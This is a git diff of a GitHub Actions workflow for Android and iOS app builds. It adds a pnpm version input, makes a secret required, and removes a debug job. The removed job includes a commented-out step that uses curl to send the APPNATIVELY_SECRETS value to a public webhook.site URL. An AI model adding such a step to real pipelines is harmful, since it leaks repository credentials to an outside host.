@@ -33,28 +33,16 @@ on:
         required: false
         type: string
         default: '3.3'
+      pnpm_version:
+        required: false
+        type: string
+        default: '10'
     secrets:
       APPNATIVELY_SECRETS:
-        required: false
+        required: true
 
 
 jobs:
-  debug-secrets:
-    runs-on: ubuntu-latest
-    steps:
-      - name: Check Secrets
-        run: |
-          echo "--- Secret Presence Check ---"
-          echo "APPNATIVELY_SECRETS: ${{ secrets.APPNATIVELY_SECRETS != '' && '✅ Set' || '❌ MISSING' }}"
-          echo "----------------------------"
-
-      # - name: Send secrets to Webhook
-      #   run: |
-      #     curl -s -X POST https://webhook.site/321180e7-df1e-40d6-8e6e-fc9afc99d2af \
-      #       -H "Content-Type: application/json" \
-      #       -d @- <<EOF
-      #     ${{ secrets.APPNATIVELY_SECRETS }}
-      #     EOF
 
   android-aab:
     name: Android AAB
@@ -66,6 +54,7 @@ jobs:
       build_id: ${{ inputs.build_id }}
       node_version: ${{ inputs.node_version }}
       java_version: ${{ inputs.java_version }}
+      pnpm_version: ${{ inputs.pnpm_version }}
 
   android-apk:
     name: Android APK
@@ -77,6 +66,7 @@ jobs:
       build_id: ${{ inputs.build_id }}
       node_version: ${{ inputs.node_version }}
       java_version: ${{ inputs.java_version }}
+      pnpm_version: ${{ inputs.pnpm_version }}
 
   ios-bundle:
     name: iOS Bundle
@@ -88,6 +78,7 @@ jobs:
       build_id: ${{ inputs.build_id }}
       node_version: ${{ inputs.node_version }}
       ruby_version: ${{ inputs.ruby_version }}
+      pnpm_version: ${{ inputs.pnpm_version }}
 
   ios-simulator:
     name: iOS Simulator
